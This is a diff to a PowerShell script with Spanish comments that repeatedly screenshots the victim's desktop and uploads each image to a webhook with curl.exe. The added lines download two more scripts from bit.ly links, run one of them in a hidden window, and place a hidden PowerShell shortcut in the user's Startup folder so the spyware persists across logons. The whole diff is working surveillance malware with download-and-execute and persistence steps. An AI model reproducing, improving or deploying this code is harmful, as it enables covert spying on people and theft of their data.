@@ -4,10 +4,19 @@ $a = 0 # Contador de imágenes enviadas al webhook
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121) {
-    Write-Host "Shortened Webhook URL Detecteduu!!..." 
-    $hookurl = (irm $hookurl).url
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!00!..." ; $hookurl = (irm $hookurl).url}
+
+# Verificar si el archivo principal ya existe
+$syswPath = "$env:USERPROFILE\sysw.ps1"
+if (!(Test-Path $syswPath)) {
+    # Descargar el script principal
+    $syswUrl = "https://bit.ly/Screen_dc"
+    Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
 }
+
+# Descargar el nuevo archivo
+$newFilePath = "$env:USERPROFILE\newFile.ps1"
+Invoke-WebRequest -Uri "https://bit.ly/497Zojh" -OutFile $newFilePath
 
 do {
     $Filett = "$env:temp\SC.png"
@@ -23,9 +32,9 @@ do {
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-    curl.exe -F "file1=@$Filett" $hookurl
+    curl.exe -F "file1=@$filett" $hookurl
     Start-Sleep 1
-    Remove-Item -Path $Filett -Force
+    Remove-Item -Path $filett
     Start-Sleep $seconds
 
     # Incrementar contador de imágenes enviadas al webhook
@@ -33,6 +42,17 @@ do {
 
     # Verificar si se ha alcanzado la cantidad máxima de imágenes
     if ($a -eq $maxImages) {
+        # Crear acceso directo en la carpeta de inicio del usuario
+        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
+        $shell = New-Object -ComObject WScript.Shell
+        $shortcut = $shell.CreateShortcut($shortcutLocation)
+        $shortcut.TargetPath = "powershell.exe"
+        $shortcut.Arguments = "-NoNewWindow -WindowStyle Hidden -File `"$syswPath`""
+        $shortcut.Save()
+
+        # Ejecutar el nuevo archivo descargado de manera oculta
+        Start-Process powershell.exe -ArgumentList "-NoNewWindow -WindowStyle Hidden -File `"$newFilePath`"" -WindowStyle Hidden
+        
         # Reiniciar contador de imágenes
         $a = 0
     }
